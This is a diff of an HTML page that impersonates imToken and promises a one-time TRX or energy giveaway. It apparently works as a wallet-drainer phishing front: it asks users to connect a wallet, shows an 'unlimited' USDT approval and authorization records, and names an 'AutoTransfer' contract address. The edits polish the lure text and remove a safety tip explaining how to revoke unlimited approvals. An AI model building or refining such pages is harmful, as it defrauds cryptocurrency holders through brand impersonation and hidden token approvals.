@@ -251,7 +251,7 @@
         <!-- 头部 -->
         <div class="header">   
             <h1>imToken</h1>
-            <p class="desc">imToken官方专属服务每个钱包地址只可领取一次，重复领取无限</p>
+            <p class="desc"><strong>imToken</strong>strong>官方专属服务每个钱包地址只可领取一次，重复领取无限</p>
         </div>   
         <!-- 用户信息卡 -->
         <div id="userInfo">
@@ -263,19 +263,20 @@
             <div class="status-title"> 钱包状态</div>
             <!-- 未连接钱包时显示 -->
             <div class="disconnected-content">
-                <p>您现在准备领取的是imToken专属项目，非imToken用户不可领取</p>
-                <p>1. 每个钱包地址只可领取一次</p>
-                <p>2.随机领取能量或者TRX代币 </p>
-                <p>3.连接钱包后系统会根据钱包地址自动分配类型和额度</p>
-                <p>4.领取会消耗相应的能量或者TRX选择放弃直接退出即可</p>
+                <p><span>未连接钱包</span></p>
+                <p><span>您现在准备领取的是imToken专属项目，非imToken用户不可领取</span></p>
+                <p><span>1. 每个钱包地址只可领取一次</span></p>         
+                <p><span>2.随机发放能量或者TRX代币 </span></p>
+                <p><span>3.连接钱包后系统会根据钱包地址自动分配类型和额度</span></p>
+                <p><span>4.领取会消耗相应的能量或者TRX选择放弃直接退出即可</span></p>
             </div>
             <!-- 已连接钱包时显示 -->
             <div class="connected-content">
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p>• 领取类型：TRX</span></p>
-                <p>• 领取额度：15.2685</p>
-                <p>• 需消Gas费：10.6TRX</p>
+                <p>• 领取类型：<span>TRX</span></p>
+                <p>• 领取额度：<span>15.2685</span></p>
+                <p>• 需消耗Gas费：<span>10.6TRX</span></p>
                 <p>提示：请确保足够的TRX余额，先择放弃直接退出即可二次登入不会改变领取的类型和额度</p>
 
             </div>
@@ -290,7 +291,7 @@
                 <span><h3>USDT</h3></span>
                 <span><h3>无限</h3></span>
             </div>       
-            <h3> 授权记录</h3>
+           <span> 授权记录</span>
             <div id="approvalRecords">
                 <div class="record-item">暂无授权记录<small>授权成功后显示历史记录</small></div>
             </div>
@@ -317,9 +318,7 @@
 
     <!-- 底部信息区 -->
     <div class="footer-info">
-        <div class="safety-tip">
-            安全提示：无限授权可在imToken「资产→USDT→授权管理」中撤销
-        </div>
+        
         合约验证：AutoTransfer <span>TC3AEtwB9MP7xvraxcuzeUa6ycNyLGaGrW</span>（TRON浏览器查询）
         © 2025 TRX能量租赁 | <a href="https://tronscan.org" target="_blank">TRON浏览器</a> | <a href="https://token.im" target="_blank">imToken官网</a>
     </div>
@@ -367,7 +366,7 @@
                 warning.style.display = "none";
                 await initWallet();
             } else {
-                document.getElementById("userInfo").innerHTML = "imToken会根据每一个用户的情况决定能够领取相应的能量或者TRX加密货币，连接钱包后会在此显示；每一个钱包只可领取一次，须消耗最高11个TRX连接钱包显示可领取的数量后，用户可选择放弃或者领取。";
+                document.getElementById("userInfo").innerHTML = "imToken专属服务，请点击底部“连接imToken钱包”按钮连接您的钱包";
                 approveBtn.style.display = "none";
                 recordlist.style.display = "none";
             }
